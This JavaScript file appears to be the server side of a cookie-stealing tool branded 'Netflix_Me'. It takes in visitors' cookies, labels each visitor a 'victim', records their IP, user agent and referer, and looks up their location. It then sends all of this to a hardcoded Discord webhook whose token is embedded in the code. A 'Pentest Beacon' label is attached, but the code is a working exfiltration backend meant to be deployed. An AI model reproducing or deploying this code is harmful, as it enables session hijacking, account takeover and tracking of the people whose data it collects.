export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({error:'POST only'});
  
  const data = req.body;
  const victim = {
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown',
    ua: req.headers['user-agent'] || 'Unknown',
    cookies: data.cookies || {},
    referer: req.headers.referer || '',
    time: new Date().toISOString()
  };
  
  // GEOIP ENRICHMENT
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${victim.ip}?fields=status,message,country,regionName,city,isp,org,proxy,hosting`);
    const geo = await geoResponse.json();
    if (geo.status === 'success') {
      victim.geo = `${geo.country || '?'} / ${geo.regionName || '?'} / ${geo.city || '?'}`;
      victim.isp = geo.isp || '?';
      victim.proxy = geo.proxy || geo.hosting || false;
    }
  } catch(e) { victim.geo = 'N/A'; }
  
  // DISCORD WEBHOOK - REPLACE YOUR_WEBHOOK_HERE
  fetch('https://discord.com/api/webhooks/1466414596364697702/v7A116HwPH97RLGYUHauVMwpDM47T5R50rEcD3ROXRpuvwLaCII0JjU13844BGjIIFhh', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      embeds: [{
        title: '📺 NETFLIX_ME HIT DETECTED',
        fields: [
          {name: '🖥️ IP', value: `\`${victim.ip}\``, inline: true},
          {name: '🌍 Geo', value: `\`${victim.geo}\``, inline: true},
          {name: '🔒 Proxy/VPN', value: victim.proxy ? '🔴 DETECTED' : '🟢 Clean', inline: true},
          {name: '🌐 User-Agent', value: `\`${victim.ua.slice(0,60)}...\``, inline: false},
          {name: '🍪 Cookies', value: `\`${Object.entries(data.cookies || {}).slice(0,4).map(([k,v])=>`${k}=${v?.slice(0,25)}`).join(', ')}...\``, inline: false},
          {name: '🔗 Referer', value: `\`${victim.referer.slice(0,80)}...\``, inline: false}
        ],
        color: 0xff4444,
        timestamp: new Date().toISOString(),
        footer: {text: 'Netflix_Me Pentest Beacon'}
      }]
    })
  }).catch(e => console.error('Discord failed:', e));
  
  console.log(`📺 HIT: ${victim.ip} | ${victim.geo} | Cookies: ${Object.keys(data.cookies || {}).length}`);
  res.status(200).json({success: true, netflix_me: 'activated'});
}
